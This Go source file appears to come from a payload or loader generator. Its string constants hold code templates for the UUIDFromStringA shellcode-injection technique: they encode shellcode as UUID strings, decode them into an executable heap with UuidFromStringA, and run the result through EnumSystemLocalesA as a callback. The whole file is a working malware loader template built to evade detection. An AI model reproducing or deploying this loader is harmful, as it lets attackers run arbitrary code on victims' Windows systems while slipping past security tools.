package local

const UUIDFromStringAImports = `
	// Standard
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	
	
	"unsafe"

	

	// Sub Repositories
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/google/uuid"
`

const UUIDFromStringADlls = `

	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")

`

const UUIDFromStringA = `

	uuids, err := shellcodeToUUID(shellcode)
	if err != nil {
		log.Fatal(err.Error())
	}

	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))

	}

	/*	https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
		DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
		HANDLE hHeap,
		DWORD  dwFlags,
		SIZE_T dwBytes
		);
	*/

	// Allocate the heap
	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
	}

	/*
		RPC_STATUS UuidFromStringA(
		RPC_CSTR StringUuid,
		UUID     *Uuid
		);
	*/

	addrPtr := addr
	for _, uuid := range uuids {
		// Must be a RPC_CSTR which is null terminated
		u := append([]byte(uuid), 0)

		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
		}

		addrPtr += 16
	}

	/*
		BOOL EnumSystemLocalesA(
		LOCALE_ENUMPROCA lpLocaleEnumProc,
		DWORD            dwFlags
		);
	*/

	// Execute Shellcode

	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
	}
`
const UUIDFromStringAExtra = `
func shellcodeToUUID(shellcode []byte) ([]string, error) {

	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// This seems unecessary or overcomplicated way to do this

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}
`
